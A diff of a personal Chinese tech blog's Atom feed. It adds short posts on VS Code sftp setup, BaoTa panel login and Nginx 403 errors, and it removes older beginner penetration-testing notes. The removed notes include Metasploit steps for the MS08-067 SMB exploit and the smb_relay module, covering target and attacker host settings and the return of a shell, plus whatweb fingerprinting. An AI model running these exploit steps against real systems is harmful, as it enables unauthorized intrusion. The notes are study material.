@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://qiyulong.top</id>
     <title>吃小熊的霸王龙</title>
-    <updated>2020-06-30T04:04:07.459Z</updated>
+    <updated>2020-07-02T02:58:13.908Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://qiyulong.top"/>
     <link rel="self" href="https://qiyulong.top/atom.xml"/>
@@ -10,6 +10,45 @@
     <logo>https://qiyulong.top/images/avatar.png</logo>
     <icon>https://qiyulong.top/favicon.ico</icon>
     <rights>All rights reserved 2020, 吃小熊的霸王龙</rights>
+    <entry>
+        <title type="html"><![CDATA[vs code链接ftp]]></title>
+        <id>https://qiyulong.top/post/vs-code-lian-jie-ftp/</id>
+        <link href="https://qiyulong.top/post/vs-code-lian-jie-ftp/">
+        </link>
+        <updated>2020-07-02T02:43:32.000Z</updated>
+        <content type="html"><![CDATA[<p>1.安装插件sftp<br>
+2.ctrl+shift+p调出窗口输入sftp:config<br>
+3.配置基本信息，代码如下<br>
+{<br>
+&quot;name&quot;:&quot;站点名称&quot;,<br>
+&quot;host&quot;: &quot;IP地址&quot;,<br>
+&quot;username&quot;: &quot;登录名&quot;,<br>
+&quot;password&quot;: &quot;登录密码&quot;,<br>
+&quot;protocol&quot;: &quot;sftp&quot;,<br>
+&quot;port&quot;: 22,<br>
+&quot;remotePath&quot;: &quot;链接路径&quot;,<br>
+&quot;uploadOnSave&quot;: true,//上传下载服务<br>
+}</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[xshell查看宝塔登录相关]]></title>
+        <id>https://qiyulong.top/post/xshell-cha-kan-bao-ta-deng-lu-xiang-guan/</id>
+        <link href="https://qiyulong.top/post/xshell-cha-kan-bao-ta-deng-lu-xiang-guan/">
+        </link>
+        <updated>2020-07-02T02:41:14.000Z</updated>
+        <content type="html"><![CDATA[<p>bt default</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Nginx出现403 forbidden]]></title>
+        <id>https://qiyulong.top/post/nginx-chu-xian-403-forbidden/</id>
+        <link href="https://qiyulong.top/post/nginx-chu-xian-403-forbidden/">
+        </link>
+        <updated>2020-07-01T12:07:28.000Z</updated>
+        <content type="html"><![CDATA[<p>Nginx出现403 forbidden：根目录下没有index文件，或者未添加入口文件为默认文档</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[JS篇]]></title>
         <id>https://qiyulong.top/post/js-pian/</id>
@@ -118,65 +157,6 @@ sqlmap.py</p>
         </link>
         <updated>2020-06-24T01:55:29.000Z</updated>
         <content type="html"><![CDATA[<p>每年都会公布年度十大漏洞。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[kali判断web环境]]></title>
-        <id>https://qiyulong.top/post/kali-pan-duan-web-huan-jing/</id>
-        <link href="https://qiyulong.top/post/kali-pan-duan-web-huan-jing/">
-        </link>
-        <updated>2020-06-24T01:18:30.000Z</updated>
-        <content type="html"><![CDATA[<p>命令：<br>
-whatweb www.baidu.com<br>
-即可查询百度的ip等web环境</p>
-<p>-h:帮助<br>
-whatweb -h<br>
-可查询此命令的意思</p>
-<p>-v:查看详情<br>
-whatweb -v www.baidu.com<br>
-更规范详细的展示web环境</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[网络服务器攻击渗透(MS08-067)]]></title>
-        <id>https://qiyulong.top/post/wang-luo-fu-wu-qi-gong-ji-shen-tou-ms08-067/</id>
-        <link href="https://qiyulong.top/post/wang-luo-fu-wu-qi-gong-ji-shen-tou-ms08-067/">
-        </link>
-        <updated>2020-06-23T03:55:56.000Z</updated>
-        <content type="html"><![CDATA[<p>msfconsole</p>
-<p>search ms08-067</p>
-<p>use exploit/windows/smb/ms08_067_netapi</p>
-<p>show options<br>
-<img src="https://qiyulong.top/post-images/1592885158366.png" alt="" loading="lazy"></p>
-<p>此处只设置IP地址即可:<br>
-set RHSTS 192.168.1.111</p>
-<p>查看有哪些漏洞:<br>
-info</p>
-<p>check查看是否有漏洞:<br>
-check<br>
-(备注：需要上图中check为yes才可用)</p>
-<p>监听攻击:<br>
-exploit</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[msf-payloads模块]]></title>
-        <id>https://qiyulong.top/post/msf-payloads-mo-kuai/</id>
-        <link href="https://qiyulong.top/post/msf-payloads-mo-kuai/">
-        </link>
-        <updated>2020-06-23T03:38:16.000Z</updated>
-        <content type="html"><![CDATA[<p>show payloads</p>
-<p>搜索模块：<br>
-search ms08</p>
-<p>进入模块：<br>
-use exploit/windows/smb/smb_relay</p>
-<p>查看信息：<br>
-show options</p>
-<p>RHOST:目标主机IP地址<br>
-RPORT:目标主机链接端口<br>
-Payload:有效的载荷，成功后返回shell<br>
-LHOST:攻击者的IP地址<br>
-LPORT:攻击者的端口</p>
 ]]></content>
     </entry>
 </feed>
